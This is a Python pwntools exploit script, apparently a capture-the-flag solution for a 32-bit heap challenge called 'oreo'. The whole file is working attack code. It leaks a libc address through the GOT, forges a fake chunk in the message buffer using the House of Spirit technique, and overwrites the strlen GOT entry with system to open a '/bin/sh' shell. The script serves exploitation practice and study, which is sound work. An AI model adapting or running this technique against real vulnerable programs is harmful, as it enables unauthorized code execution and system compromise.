from pwn import *
# from LibcSearcher import *
context(log_level='debug',terminal=["tmux","splitw","-h"])
binary = "./oreo"
libc_binary = "/lib/i386-linux-gnu/libc.so.6"

p = process(argv=[binary])
# p = remote("",)

elf = ELF(binary)
libc = ELF(libc_binary)

def add(des,name):
    p.sendline("1")
    p.sendline(str(name))
    p.sendline(str(des))

def show():
    p.sendline("2")
    p.recvuntil('===================================\n')

def free():
    p.sendline("3")

def message(mes):
    p.sendline("4")
    p.sendline(str(mes))

def stats():
    p.sendline("5")


# leak libc base
add("a"*25,"b"*27+p32(elf.got["puts"]))
show()
p.recvuntil("Description: ")
p.recvuntil("Description: ")
puts_addr = u32(p.recv(4))
log.success("puts_addr is ->" + hex( puts_addr ))
system_addr = puts_addr - libc.sym["puts"] + libc.sym["system"]
log.success("system_addr is ->" + hex( system_addr ))

# fake chunk on message
# chunk size 0x40
message_addr = 0x804a2a8
for i in range(0x40-1):
    add("a"*25,"b"*27+p32(0))

# chunk 0x41
add('t'*25,"t"*27+p32(message_addr))

# payload = 0x20 * '\x00' + p32(0x40) + p32(0x100)
# payload = payload.ljust(52, 'b')
# payload += p32(0)
# payload = payload.ljust(128, 'c')

payload = 'a'*(0x20-4)+'\x00'*4 + 'a'*4 + p32(0x41)    #padding + last_heap + prev_size_of_fake_chunk + size_of_fake_chunk
message(payload)
# message(payload)
free()

# __free_hook = puts_addr - libc.sym["puts"] + libc.sym["__free_hook"]
# one_offset = 0x4527a
# one_gadget_addr = puts_addr - libc.sym["puts"] + one_offset

payload = p32(elf.got["strlen"]).ljust(20,"a")
# gdb.attach(p)
add(payload,"b"*20)
message(p32(system_addr) + ';/bin/sh\x00')
free()


p.interactive()
